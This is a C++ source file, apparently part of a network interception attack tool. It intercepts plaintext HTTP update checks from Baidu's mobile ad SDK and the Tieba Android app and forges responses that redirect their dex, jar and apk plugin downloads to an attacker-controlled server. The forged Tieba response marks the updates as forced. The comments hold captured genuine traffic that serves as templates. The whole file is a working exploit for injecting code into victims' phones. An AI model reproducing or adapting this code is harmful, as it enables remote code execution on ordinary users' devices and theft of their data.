#include "baidupromotion.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"

int gBaiduPromotionFlag = 0;

int BaiduPromotion::isBaiduAd(string url, string host) {
	if (host == "mobads.baidu.com")
	{
		if (strstr(url.c_str(), "/ads/") && strstr(url.c_str(), "remote_banner.php?"))
		{
			gBaiduPromotionFlag = 1;
			return TRUE;
		}else if (strstr(url.c_str(), "/ads/sec.php"))
		{
			gBaiduPromotionFlag = 2;
			return TRUE;
		}
		else if (strstr(url.c_str(), "/ads/galaxy.php"))
		{
			gBaiduPromotionFlag = 3;
			return TRUE;
		}
	}else if (host == "c.tieba.baidu.com")
	{
		if (strstr(url.c_str(), "/pluginsmisconf"))
		{
			gBaiduPromotionFlag = 4;
			return TRUE;
		}
	}

	return FALSE;
}

int BaiduPromotion::replyBaiduAd(char*lpbuffer, int len, int buflimit, string username) {

	int ret = 0;
	int respsize = 0;


	if (gBaiduPromotionFlag == 1)
	{
		string ver = "99.7063";	

		string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;
		string zipfn = "baiduproxy.jar";

		char szfile1md5[256] = { 0 };
		unsigned char hex1md5[256] = { 0 };
		string filename1 = Public::getUserPluginPath(username) + zipfn;

		int filesize = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hex1md5, TRUE);

		char * lpRespContentFormat =
			"[ { \"remotedex\": { \"url\": \"http://%s/%s\", \"version\": \"%s\","
			"\"sign\": \"%s\" } }]";

		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, 
			strip.c_str(), zipfn.c_str(), ver.c_str(), szfile1md5);

		respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return respsize;
	}
	else if (gBaiduPromotionFlag == 2)
	{

		string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;
		string zipfn = "sofire.dex_new.dex";		//mobads_sofire.dex
		char * format = "{ 'url': 'http://%s/%s', 'appsid': 'all', 'sign':'%s'}";
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char szfile1md5[256] = { 0 };
		unsigned char hex1md5[256] = { 0 };
		string filename1 = Public::getUserPluginPath(username) + zipfn;

		int filesize = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hex1md5, TRUE);

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, format, strip.c_str(), zipfn.c_str(), szfile1md5);

		respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return respsize;
	}
	else if (gBaiduPromotionFlag == 3)
	{
		string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;
		string zipfn = "galaxy_dex.jar";
		char * format = "{ 'url': 'http://%s/%s', 'appsid': 'all', 'sign':'%s'}";
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char szfile1md5[256] = { 0 };
		unsigned char hex1md5[256] = { 0 };
		string filename1 = Public::getUserPluginPath(username) + zipfn;

		int filesize = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hex1md5, TRUE);

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, format, strip.c_str(), zipfn.c_str(), szfile1md5);

		respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return respsize;
	}else if (gBaiduPromotionFlag == 4)
	{
		int ver = 996;

		string strip = HttpUtils::getIPstr(gServerIP) + "\\/" + username;
		string zipfn1 = "pluginvrvideoplayerlib.apk";
		string zipfn2 = "pluginhottopic.apk";

		char szfile1md5[256] = { 0 };
		char szfile2md5[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		string filename1 = Public::getUserPluginPath(username) + zipfn1;
		string filename2 = Public::getUserPluginPath(username) + zipfn2;

		int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hexmd5, TRUE);
		int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szfile2md5, hexmd5, TRUE);

		char * lpRespContentFormat =
"{\"plugin_config\":[{\"package_name\":\"com.baidu.tieba.pluginUserConsume\",\"display_name\":\"\",\"forbidden_features\":\"\","
"\"verbose\":\"\",\"icon\":\"\",\"newest\":[],\"priority\":\"0\",\"load_priority\":\"1\",\"ext\":\"\",\"plugintype\":\"0\","
"\"can_forbidden\":\"0\",\"version_code\":\"596\",\"enable\":\"0\"},"

"{\"package_name\":\"com.baidu.tieba.pluginAdvertSDK\",\"display_name\":\"\",\"forbidden_features\":\"\",\"verbose\":\"\",\"icon\":\"\","
"\"newest\":[],\"priority\":\"0\",\"load_priority\":\"0\",\"ext\":\"\",\"plugintype\":\"0\",\"can_forbidden\":\"0\","
"\"version_code\":\"596\",\"enable\":\"0\"},"

"{\"package_name\":\"com.baidu.tieba.pluginWallet\",\"display_name\":\"\",\"forbidden_features\":\"\",\"verbose\":\"\",\"icon\":\"\","
"\"newest\":[],\"priority\":\"0\",\"load_priority\":\"1\",\"ext\":\"\",\"plugintype\":\"0\",\"can_forbidden\":\"0\","
"\"version_code\":\"596\",\"enable\":\"0\"},"

"{\"package_name\":\"com.baidu.tieba.pluginAla\",\"display_name\":\"\",\"forbidden_features\":\"\",\"verbose\":\"\",\"icon\":\"\","
"\"newest\":[],\"priority\":\"0\",\"load_priority\":\"1\",\"ext\":\"\",\"plugintype\":\"0\",\"can_forbidden\":\"0\","
"\"version_code\":\"596\",\"enable\":\"0\"},"

"{\"package_name\":\"com.baidu.tieba.pluginVrVideoPlayerLib\",\"display_name\":\"\",\"forbidden_features\":\"\",\"verbose\":\"\",\"icon\":\"\","
"\"newest\":{\"channel\":\"all\",\"version\":\"1\",\"version_code\":\"%u\",\"change_log\":\"com.baidu.tieba.pluginVrVideoPlayerLib\","
"\"url\":\"http:\\/\\/%s\\/%s\",\"md5\":\"%s\",\"size\":\"%u\",\"download_type\":\"2\",\"is_force_update\":\"1\",\"newest_ext\":\"\"},"
"\"priority\":\"0\",\"load_priority\":\"1\",\"ext\":\"\",\"plugintype\":\"1\",\"can_forbidden\":\"0\",\"version_code\":\"%u\","
"\"enable\":\"1\"},"

"{\"package_name\":\"com.baidu.tieba.pluginHotTopic\",\"display_name\":\"\\u8d34\\u5427\\u70ed\\u8bae\",\"forbidden_features\":\"\","
"\"verbose\":\"\\u5e26\\u4f6010\\u79d2\\u949fget\\u5427\\u53cb\\u4eec\\u70ed\\u8bae\\u7684\\u8bdd\\u9898\\uff01\","
"\"icon\":\"https:\\/\\/tb1.bdstatic.com\\/tb\\/client\\/img\\/icon_chajian_reyi.png\",\"newest\":{\"channel\":\"all\","
"\"version\":\"1\",\"version_code\":\"%u\","
"\"change_log\":\"\\u5e26\\u4f6010\\u79d2\\u949fget\\u5427\\u53cb\\u4eec\\u70ed\\u8bae\\u7684\\u8bdd\\u9898\\uff01\","
"\"url\":\"http:\\/\\/%s\\/%s\",\"md5\":\"%s\",\"size\":\"%u\",\"download_type\":\"1\",\"is_force_update\":\"1\",\"newest_ext\":\"\"},"
"\"priority\":\"0\",\"load_priority\":\"1\",\"ext\":\"\",\"plugintype\":\"1\",\"can_forbidden\":\"0\",\"version_code\":\"%u\","
"\"enable\":\"1\"}],"
"\"config_version\":\"0d3254af84642829a478c9cc56c160c7\","
"\"server_time\":\"90601\",\"time\":9997569207079,\"ctime\":0,\"logid\":3079224337,\"error_code\":\"0\"}";

		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript;charset=utf-8\r\nContent-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
			ver,strip.c_str(), zipfn1.c_str(),  szfile1md5,filesize1, ver,
			ver, strip.c_str(), zipfn2.c_str(), szfile2md5, filesize2, ver
			);

		respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return respsize;
	}

	return respsize;
}


/*
mobads.baidu.com/ads/galaxy.php

GET /ads/galaxy.php HTTP/1.1
accept: *//*
connection: Keep-Alive
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; PBEM00 Build/OPM1.171019.026)
Host: mobads.baidu.com
Accept-Encoding: gzip

HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 130
Content-Type: application/octet-stream
Date: Thu, 30 May 2019 04:42:42 GMT
Etag: "5cedf425-82"
Last-Modified: Wed, 29 May 2019 02:53:25 GMT
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: nginx/1.4.5
Set-Cookie: BAIDUID=21F02980ED4F058B41A2D8990C50570E:FG=1; expires=Fri, 29-May-20 04:42:42 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1

{ 'url': 'http://mobads.baidu.com/ads/pa/galaxy/galaxy_dex_0629.jar', 'appsid': 'all', 'sign':'ad100021eab4ff82751dc23a5f4b9832'
}

mobads.baidu.com/ads/sec.php

GET /ads/sec.php HTTP/1.1
accept: *//*
connection: Keep-Alive
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)
Host: mobads.baidu.com
Accept-Encoding: gzip

HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 152
Content-Type: application/octet-stream
Date: Thu, 30 May 2019 07:16:54 GMT
Etag: "5cedf425-98"
Last-Modified: Wed, 29 May 2019 02:53:25 GMT
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: nginx/1.4.5
Set-Cookie: BAIDUID=91C082C783D4B2BBF0F0CEA9E839DE42:FG=1; expires=Fri, 29-May-20 07:16:54 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1

{ 'url': 'http://mobads.baidu.com/ads/pa/sec/sofire_wm20190521.dex', 'appsid': 'abdc5ffe,fc6ed3e7,e866cfb0', 'sign':'7dd466e06bcffb76976b8b88a333e618'
}


GET /ads/pa/8/__pasys_remote_banner.php?v=8.8108&bdr=23&tp=OPPO+A57&os=android HTTP/1.1
Content-type: text/plain
Connection: keep-alive
Cache-Control: no-cache
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: mobads.baidu.com
Accept-Encoding: gzip

HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 272
Content-Type: application/octet-stream
Date: Fri, 25 Oct 2019 05:22:00 GMT
Etag: "5d64e9dd-110"
Last-Modified: Tue, 27 Aug 2019 08:29:17 GMT
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: nginx/1.4.5
Set-Cookie: BAIDUID=537AD54B8120122C729F8A94B0B237E0:FG=1; expires=Sat, 24-Oct-20 05:22:00 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1

{'url':'http://mobads.baidu.com/ads/pa/8/__xadsdk__remote__8.8108.jar','version':'8.8108','sign':'hqIbpFfjDvK/Pa4NHo3wyN0Fdj4CG9jHCtOVlzTXvQuLlVxP9Fnm/rZ4V3OqjPvodBgP9FH32Cz4wXo8+q6jzSBa/5gVifCsxNhXD1MQKnOiVlo+msqgCAOO7En8o4QBhyE7okw/wbstiFeIo0s75/B+u2NRd+6GYODMGtRqXvY='}


//mobads.baidu.com/ads/pa/proxy/remote_banner.php?v=8.7063&tp=BLN-AL10&os=android&bdr=24
GET /ads/pa/proxy/remote_banner.php?v=8.7063&tp=BLN-AL10&os=android&bdr=24 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; BLN-AL10 Build/HONORBLN-AL10)
Host: mobads.baidu.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 148
Content-Type: application/octet-stream
Date: Thu, 30 May 2019 05:48:07 GMT
Etag: "5cedf425-94"
Last-Modified: Wed, 29 May 2019 02:53:25 GMT
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: nginx/1.4.5
Set-Cookie: BAIDUID=99FE0D9139F4C8509E5558EB553E2D27:FG=1; expires=Fri, 29-May-20 05:48:07 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1

[ { "remotedex": { "url": "http://mobads.baidu.com/ads/pa/proxy/proxy043.jar", "version": "8.7063", "sign": "062fa3f46bd4b1685fdc35f61380c646" } }
]
*/

/*
GET /ads/preload.php HTTP/1.1
accept: *//*
connection: Keep-Alive
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; PBEM00 Build/OPM1.171019.026)
Host: mobads.baidu.com
Accept-Encoding: gzip

HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 667
Content-Type: application/octet-stream
Date: Thu, 30 May 2019 04:42:45 GMT
Etag: "5cedf425-29b"
Last-Modified: Wed, 29 May 2019 02:53:25 GMT
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: nginx/1.4.5
Set-Cookie: BAIDUID=786097BC8B0F684219A3569B98AB8443:FG=1; expires=Fri, 29-May-20 04:42:45 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1

{ "preload": [{ "url": "http://ubmcmm.baidustatic.com/media/v1/0f000KgiXojDSMDqMJ-Ugf.zip", 
"appsid": "aa7bab79", "expired": "20171201", "mimetype": "rm/vr" }, 
{ "url": "http://ubmcmm.baidustatic.com/media/v1/0f000KgiXojDSMDqMJ-Ugf.zip", 
"appsid": "a6deb091", "expired": "20171201", "mimetype": "rm/vr" }, 
{ "url": "https://ss0.bdstatic.com/-0U0bnSm1A5BphGlnYG/cae-legoup-video-target/3c420207-0a65-455c-8589-fde670eba20f.mp4", 
"appsid": "bb3808eb", "expired": "20180101", "mimetype": "video/mp4" }, 
{ "url":"https://ss0.bdstatic.com/-0U0bnSm1A5BphGlnYG/cae-legoup-video-target/3c420207-0a65-455c-8589-fde670eba20f.mp4", 
"appsid":"d80bd4c2", "expired":"20191225" }]
}

*/


/*
c.tieba.baidu.com/c/s/pluginsmisconf?_client_id=wappc_1569206996174_14&_client_type=2&_client_version=10.3.8.12&_phone_imei=000000000000000&
cuid=baidutiebaapp0e0698e6-5c87-4d03-8ba0-b952180ee50a&
cuid_galaxy2=E1015AAAF32AA620943EF2E1AF2F2F88%7CO&cuid_gid=&from=1014613i&model=MIX+2S&net_type=1&
plugin_upload_config=com.baidu.tieba.pluginUserConsume%3A596%2Ccom.baidu.tieba.pluginVrVideoPlayerLib%3A559%2C
com.baidu.tieba.pluginWallet%3A596%2Ccom.baidu.tieba.pluginAdvertSDK%3A596%2Ccom.baidu.tieba.pluginAla%3A596%2C
com.baidu.tieba.pluginHotTopic%3A559&
sign=A2B5D7B0DA5DBBCE9A115F26B1416290&stErrorNums=1&stMethod=1&stMode=1&stSize=5674&stTime=807&stTimesNum=1&
timestamp=1569207077015&z_id=2xWM_n16BWZ6rqYo00v1MaFco5zmwO98Tm8jZI-fOQ-tuM78u-bDeQ5pYvvE8onmz4dzMR54UCIXzYFN1gMooAA

POST /c/s/pluginsmisconf HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: ka=open
cuid: baidutiebaapp0e0698e6-5c87-4d03-8ba0-b952180ee50a
User-Agent: bdtb for Android 10.3.8.12
Connection: Keep-Alive
cuid_galaxy2: E1015AAAF32AA620943EF2E1AF2F2F88|O
Accept-Encoding: gzip
client_logid: 1569206993449
Host: c.tieba.baidu.com
Content-Length: 738

_client_id=wappc_1569206996174_14&_client_type=2&_client_version=10.3.8.12&_phone_imei=000000000000000&
cuid=baidutiebaapp0e0698e6-5c87-4d03-8ba0-b952180ee50a&
cuid_galaxy2=E1015AAAF32AA620943EF2E1AF2F2F88%7CO&cuid_gid=&from=1014613i&model=MIX+2S&net_type=1&
plugin_upload_config=com.baidu.tieba.pluginUserConsume%3A596%2Ccom.baidu.tieba.pluginVrVideoPlayerLib%3A559%2C
com.baidu.tieba.pluginWallet%3A596%2Ccom.baidu.tieba.pluginAdvertSDK%3A596%2Ccom.baidu.tieba.pluginAla%3A596%2C
com.baidu.tieba.pluginHotTopic%3A559&
sign=A2B5D7B0DA5DBBCE9A115F26B1416290&stErrorNums=1&stMethod=1&stMode=1&stSize=5674&stTime=807&stTimesNum=1&
timestamp=1569207077015&z_id=2xWM_n16BWZ6rqYo00v1MaFco5zmwO98Tm8jZI-fOQ-tuM78u-bDeQ5pYvvE8onmz4dzMR54UCIXzYFN1gMooAA

HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: application/x-javascript;charset=utf-8
Date: Mon, 23 Sep 2019 02:51:19 GMT
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: Apache
Set-Cookie: BAIDUID=DEE8EFDF9A8525FDD50036A823AE692D:FG=1; expires=Tue, 22-Sep-20 02:51:19 GMT; max-age=31536000; path=/; 
domain=.baidu.com; version=1
Tracecode: 30792243370430940682092310
Tracecode: 30792243370673019146092310
Vary: Accept-Encoding
X-Xss-Protection: 1; mode=block
Transfer-Encoding: chunked

{"plugin_config":[{"package_name":"com.baidu.tieba.pluginUserConsume","display_name":"","forbidden_features":"",
"verbose":"","icon":"","newest":[],"priority":"0","load_priority":"1","ext":"","plugintype":"0","can_forbidden":"0",
"version_code":"596","enable":"0"},{"package_name":"com.baidu.tieba.pluginAdvertSDK","display_name":"","forbidden_features":"",
"verbose":"","icon":"","newest":[],"priority":"0","load_priority":"0","ext":"","plugintype":"0","can_forbidden":"0",
"version_code":"596","enable":"0"},{"package_name":"com.baidu.tieba.pluginWallet","display_name":"","forbidden_features":"",
"verbose":"","icon":"","newest":[],"priority":"0","load_priority":"1","ext":"","plugintype":"0","can_forbidden":"0",
"version_code":"596","enable":"0"},{"package_name":"com.baidu.tieba.pluginAla","display_name":"","forbidden_features":"",
"verbose":"","icon":"","newest":[],"priority":"0","load_priority":"1","ext":"","plugintype":"0","can_forbidden":"0","version_code":"596",
"enable":"0"},
{"package_name":"com.baidu.tieba.pluginVrVideoPlayerLib","display_name":"","forbidden_features":"","verbose":"",
"icon":"","newest":{"channel":"all","version":"1","version_code":"596","change_log":"com.baidu.tieba.pluginVrVideoPlayerLib",
"url":"http:\/\/tb1.bdstatic.com\/tb\/client\/plugin\/10_3_8_12\/com.baidu.tieba.pluginVrVideoPlayerLib_109.apk",
"md5":"07f23c62814d10bca003cf669f7e0f33","size":"605470 ","download_type":"2","is_force_update":"1","newest_ext":""},
"priority":"0","load_priority":"1","ext":"","plugintype":"1","can_forbidden":"0","version_code":"559","enable":"1"},
{"package_name":"com.baidu.tieba.pluginHotTopic","display_name":"\u8d34\u5427\u70ed\u8bae","forbidden_features":"",
"verbose":"\u5e26\u4f6010\u79d2\u949fget\u5427\u53cb\u4eec\u70ed\u8bae\u7684\u8bdd\u9898\uff01",
"icon":"https:\/\/tb1.bdstatic.com\/tb\/client\/img\/icon_chajian_reyi.png","newest":{"channel":"all","version":"1","version_code":"596",
"change_log":"\u5e26\u4f6010\u79d2\u949fget\u5427\u53cb\u4eec\u70ed\u8bae\u7684\u8bdd\u9898\uff01",
"url":"http:\/\/tb1.bdstatic.com\/tb\/client\/plugin\/10_3_8_12\/com.baidu.tieba.pluginHotTopic_109.apk",
"md5":"b3e10eff640603eb81d01a5eb9fcb1b3","size":"281269","download_type":"1","is_force_update":"1","newest_ext":""},
"priority":"0","load_priority":"1","ext":"","plugintype":"1","can_forbidden":"0","version_code":"559","enable":"1"}],
"config_version":"b7e2758fd43032d3391ab62f248ccd5c","server_time":"10601","time":1569207079,"ctime":0,"logid":3079224337,"error_code":"0"}
*/